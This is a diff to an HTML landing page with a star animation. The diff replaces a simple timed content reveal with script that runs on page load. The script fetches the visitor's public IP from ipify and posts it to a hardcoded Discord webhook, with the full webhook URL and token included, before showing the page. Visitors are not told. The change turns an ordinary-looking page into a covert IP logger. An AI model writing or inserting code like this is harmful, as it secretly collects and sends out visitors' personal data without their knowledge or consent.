@@ -106,12 +106,12 @@
             font-weight: bold;
             text-shadow: 0 0 30px rgba(255, 255, 0, 1), 0 0 50px rgba(255, 255, 0, 0.5);
             position: absolute;
-            top: 20%; /* Adjusted to position higher */
+            top: 20%; 
             transform: translateY(-50%);
             text-transform: uppercase;
         }
         .hidden {
-            display: none; /* Class to hide content initially */
+            display: none; 
         }
     </style>
 </head>
@@ -169,11 +169,28 @@
 
         setInterval(createStar, 400);
 
-        // Show the main content after a delay
-        setTimeout(() => {
-            document.getElementById('main-content').classList.remove('hidden'); // Show the main content
-            document.querySelector('.message').style.display = 'none'; // Hide the loading message
-        }, 2000); // 2000 milliseconds = 2 seconds
+        // Function to send IP to Discord webhook
+        function sendIPToWebhook(ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1290875920374304821/afWI4CdwHvdy8T8RWTwFywnsOc26AxEwOjrkfmAsjyZL8CAMoBRt1QlBqbekUGVBn4sH';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `IP Address: ${ip}`
+                }),
+            });
+        }
+
+        // Get the user's IP and send it to the webhook
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sendIPToWebhook(data.ip);
+                document.querySelector(".message").style.display = 'none';
+                document.getElementById("main-content").classList.remove('hidden');
+            });
     </script>
 </body>
 </html>
